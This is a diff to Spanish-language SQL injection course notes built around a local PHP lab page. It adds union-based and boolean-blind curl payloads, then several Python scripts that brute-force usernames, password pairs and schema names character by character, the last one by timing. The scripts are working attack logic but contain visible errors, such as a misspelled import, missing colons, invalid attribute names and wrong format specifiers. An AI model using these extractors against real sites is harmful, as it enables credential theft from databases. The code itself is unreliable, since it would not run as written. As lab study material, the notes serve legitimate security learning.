@@ -2247,7 +2247,7 @@ union select group_concat(username,0x3a,password) from users-- -
 
 
 # S4vitar nos comenta que esto sucede porque vemos el error
-# Sin embargo hay momentos en los que el desarrollador no nos mostrará los errores
+# Sin embargo hay momentos en los que el desarrollador no nos mostrará los errores, por lo tanto lo anterior no lo podremos ver
 # Modificamos el archivo searchUsers.php
 # ----- searchUsers.php inicio
 <?
@@ -2270,13 +2270,276 @@ union select group_concat(username,0x3a,password) from users-- -
 ?>
 # ----- searchUsers.php fin
 
+id=-1' union select database()-- - # 'Porque tenemos solo una consulta en el archivo php
+
+# 3er método visto por savitar bind
+# La pagina está sanitizada y sin mostrar errores
+# Modificamos el archivo searchUsers.php
+# ----- searchUsers.php inicio
+<?
+    $server = "localhost";
+    $username = "s4vitar";
+    $password = "s4vitar456";
+    $database = "Hack4u";
+
+    # Conexión a la base de datos
+    $conn = new mysqli($server, $username, $password, $database);
+
+    # Sanitizacion
+    $id = mysqli_real_escape_string($conn, $_GET['id']);
+    
+    $data = mysqli_query($conn, "select username from users where id = '$id'") or die(mysqli_error($conn));
+
+    $response = mysqli_fetch_array($data);
+
+    if(!isset($response['username'])){
+        http_response_code(400);
+    }
+?>
+# ----- searchUsers.php fin
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=1" # Nos devuelve codigo de estado 200
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9" # Nos devuelve codigo de estado 400
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or 1=1" # Nos devuelve codigo de estado 200
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or 1=2" # Nos devuelve codigo de estado 400
+
+curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)" # Nos devuelve codigo de estado 200 porque a:97 = 97:a
+
+# Nos creamos un archivo en python
+# ----- sqli.py inicio
+#!/usr/bin/env python3
+import requests, signal, sys, time, string
+from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+
+# Ctrl+C
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(3)
+
+    p2 = log.process("Datos extraídos")
+    extracted_info = ""
+
+    for position in range(1,50):
+        for character in range(33,126)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
+
+            p1.status(sqli_url)
+
+            r = request.get(sqli_url)
+
+            if r.status.code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ = "__main__":
+    makeSQLI()
+# ----- sqli.py fin
 
 
 
+# NESTED QUERY Modificamos el archivo de python archivo en python
+# ----- sqli.py inicio
+#!/usr/bin/env python3
+import requests, signal, sys, time, string
+from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+
+# Ctrl+C
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(3)
+
+    p2 = log.process("Datos extraídos")
+    extracted_info = ""
+
+    for position in range(1,50):
+        for character in range(33,126)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
+
+            p1.status(sqli_url)
+
+            r = request.get(sqli_url)
+
+            if r.status.code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ = "__main__":
+    makeSQLI()
+# ----- sqli.py fin
 
 
 
+# NESTED QUERY Modificamos el archivo de python archivo en python
+# ----- sqli.py inicio
+#!/usr/bin/env python3
+import requests, signal, sys, time, string
+from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
 
+# Ctrl+C
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(3)
+
+    p2 = log.process("Datos extraídos")
+    extracted_info = ""
+
+    for position in range(1,50):
+        for character in range(33,126)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
+
+            p1.status(sqli_url)
+
+            r = request.get(sqli_url)
+
+            if r.status.code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ = "__main__":
+    makeSQLI()
+# ----- sqli.py fin
+
+
+
+# NESTED QUERY Modificamos el archivo de python archivo en python
+# ----- sqli.py inicio
+#!/usr/bin/env python3
+import requests, signal, sys, time, string
+from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+
+# Ctrl+C
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(3)
+
+    p2 = log.process("Datos extraídos")
+    extracted_info = ""
+
+    for position in range(1,50):
+        for character in range(33,126)
+            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
+
+            p1.status(sqli_url)
+
+            r = request.get(sqli_url)
+
+            if r.status.code == 200:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ = "__main__":
+    makeSQLI()
+# ----- sqli.py fin
+
+
+
+# Vemos inyecciones basadas en tiempo
+# NESTED QUERY Modificamos el archivo de python archivo en python
+# ----- sqli.py inicio
+#!/usr/bin/env python3
+import requests, signal, sys, time, string
+from pwm import * # Si no tenemos pwn, pip3 install pwn para jugar con barras de progreso
+
+# Ctrl+C
+
+def def_handler(sig, frame):
+    print(f"\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://localhost/searchUsers.php"
+characters = string.printable
+
+def makeSQLI():
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando proceso de fuerza bruta")
+    time.sleep(3)
+
+    p2 = log.process("Datos extraídos")
+    extracted_info = ""
+
+    for position in range(1,50):
+        for character in range(33,126)
+            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), $d,1))=$d,sleep(0.35),1)" % (position, character)
+
+            p1.status(sqli_url)
+
+            time_start = time.time()
+
+            r = request.get(sqli_url)
+
+            time_end = time.time()
+
+            if time_end - time_start > 0.35:
+                extracted_info += chr(character)
+                p2.status(extracted_info)
+                break
+
+if __name__ = "__main__":
+    makeSQLI()
+# ----- sqli.py fin
 
 
 ```
